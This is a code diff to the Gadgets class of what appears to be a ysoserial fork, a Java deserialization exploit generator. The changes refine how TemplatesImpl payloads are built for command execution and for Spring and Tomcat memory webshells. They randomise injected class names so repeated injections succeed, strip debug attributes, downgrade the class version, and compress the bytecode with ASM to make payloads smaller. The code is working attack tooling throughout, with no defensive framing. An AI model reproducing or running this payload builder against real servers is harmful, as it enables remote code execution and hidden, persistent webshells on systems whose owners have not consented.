@@ -9,6 +9,9 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import javassist.*;
+import org.objectweb.asm.*;
+import javassist.bytecode.*;
+import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang.RandomStringUtils;
 import org.apache.wicket.util.file.Files;
@@ -22,6 +25,7 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 import java.util.zip.GZIPOutputStream;
 
@@ -32,6 +36,7 @@ import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIA
  * utility generator functions for common jdk-only gadgets
  */
 @SuppressWarnings({"restriction", "rawtypes", "unchecked"})
+@Slf4j
 public class Gadgets {
 
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
@@ -104,23 +109,27 @@ public class Gadgets {
 //        pool.insertClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
         CtClass superC = pool.get(abstTranslet.getName());
         CtClass ctClass;
+
         if (command != null) {
             ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
-            ctClass.setName(ctClass.getName() + System.nanoTime());
+            ctClass.setName(ClassNameUtil.getRandomInjectorClassName());
             String cmd = "cmd = \"" + command + "\";";
             ctClass.makeClassInitializer().insertBefore(cmd);
+            ctClass.getClassFile().setMajorVersion(50);
+            shrinkBytes(ctClass);
 //            ctClass.setSuperclass(superC);
             classBytes = ctClass.toBytecode();
+            classBytes = compressBytecode(classBytes);
         }
         if (myClass != null) {
             // CLASS:
             ctClass = pool.get(myClass.getName());
-            ctClass.setSuperclass(superC);
+//            ctClass.setSuperclass(superC);
             // SpringInterceptorMemShell单独对待
             if (myClass.getName().contains("SpringInterceptorMemShell")) {
                 // 修改b64字节码
                 CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
-                String clazzName = "ysoserial.payloads.templates.SpringInterceptorTemplate" + System.nanoTime();
+                String clazzName = ClassNameUtil.getRandomInjectorClassName();
                 springTemplateClass.setName(clazzName);
                 String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
                 String b64content = "b64=\"" + encode + "\";";
@@ -128,18 +137,21 @@ public class Gadgets {
                 // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
                 String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                 ctClass.makeClassInitializer().insertBefore(clazzNameContent);
-                ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
+                ctClass.setName("SpringInterceptorMemShell" + System.nanoTime());
+                shrinkBytes(ctClass);
                 classBytes = ctClass.toBytecode();
             } else {
                 // 其他的TomcatFilterMemShellFromThread这种可以直接加载 需要随机命名类名
-                ctClass.setName(myClass.getName() + System.nanoTime());
+                ctClass.setName(ClassNameUtil.getRandomInjectorClassName());
+                ctClass.getClassFile().setMajorVersion(50);
                 classBytes = ctClass.toBytecode();
+                classBytes = compressBytecode(classBytes);
             }
         }
         if (bytes != null) {
             // FILE:
             ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
-            String name = ctClass.getName() + System.nanoTime();
+            String name = ClassNameUtil.getRandomInjectorClassName();
             ctClass.setName(name);
             ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
             GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
@@ -149,15 +161,16 @@ public class Gadgets {
             // System.out.println(content);
             ctClass.makeClassInitializer().insertBefore(content);
             ctClass.makeClassInitializer().insertBefore("ByPassJavaModul("+name+".class);");
-//            ctClass.writeFile();
-
+            shrinkBytes(ctClass);
+            ctClass.getClassFile().setMajorVersion(50);
 //            ctClass.setSuperclass(superC);
             classBytes = ctClass.toBytecode();
+            classBytes = compressBytecode(classBytes);
         }
 
-
+        CtClass cc = pool.makeClass("Foo");
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Foo.class)});
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, cc.toBytecode() });
 
         // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
@@ -203,5 +216,72 @@ public class Gadgets {
     public static class Foo implements Serializable {
 
         private static final long serialVersionUID = 8207363842866235160L;
+    }
+
+
+
+    public static void shrinkBytes(CtClass ctClass) {
+        try {
+            ClassFile classFile = ctClass.getClassFile2();
+            classFile.removeAttribute(SourceFileAttribute.tag);
+            classFile.removeAttribute(LineNumberAttribute.tag);
+            classFile.removeAttribute(LocalVariableAttribute.tag);
+            classFile.removeAttribute(LocalVariableAttribute.typeTag);
+            classFile.removeAttribute(DeprecatedAttribute.tag);
+            classFile.removeAttribute(AnnotationDefaultAttribute.tag);
+            classFile.removeAttribute(InnerClassesAttribute.tag);
+            classFile.removeAttribute(EnclosingMethodAttribute.tag);
+//            classFile.removeAttribute(SignatureAttribute.tag);
+            // classFile.removeAttribute(StackMapTable.tag);
+            List<MethodInfo> list = classFile.getMethods();
+            for (MethodInfo info : list) {
+                info.removeAttribute("RuntimeVisibleAnnotations");
+                info.removeAttribute("RuntimeInvisibleAnnotations");
+                info.removeAttribute("RuntimeVisibleParameterAnnotations");
+                info.removeAttribute("RuntimeInvisibleParameterAnnotations");
+                info.removeAttribute("AnnotationDefault");
+            }
+        } catch (Throwable e) {
+            log.error(e.getMessage());
+        }
+    }
+
+    public static  byte[] compressBytecode(byte[] bytes) {
+        // Logger.normal("Origin bytecode length: " + bytes.length);
+        ClassReader cr = new ClassReader(bytes);
+        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
+        int api = Opcodes.ASM9;
+        ClassVisitor cv = new ShortClassVisitor(api, cw);
+        int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
+        cr.accept(cv, parsingOptions);
+        byte[] out = cw.toByteArray();
+        // log.info("Compress bytecode length: " + out.length);
+        // log.info(String.format("The compression ratio is %.2f%%", (float) (bytes.length - out.length) / bytes.length));
+        return out;
+    }
+
+    static class ShortClassVisitor extends ClassVisitor {
+        private final int api;
+
+        public ShortClassVisitor(int api, ClassVisitor classVisitor) {
+            super(api, classVisitor);
+            this.api = api;
+        }
+
+        @Override
+        public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
+            MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+            return new ShortMethodAdapter(this.api, mv);
+        }
+    }
+    static class ShortMethodAdapter extends MethodVisitor implements Opcodes {
+        public ShortMethodAdapter(int api, MethodVisitor methodVisitor) {
+            super(api, methodVisitor);
+        }
+
+        @Override
+        public void visitLineNumber(int line, Label start) {
+            // delete line number
+        }
     }
 }
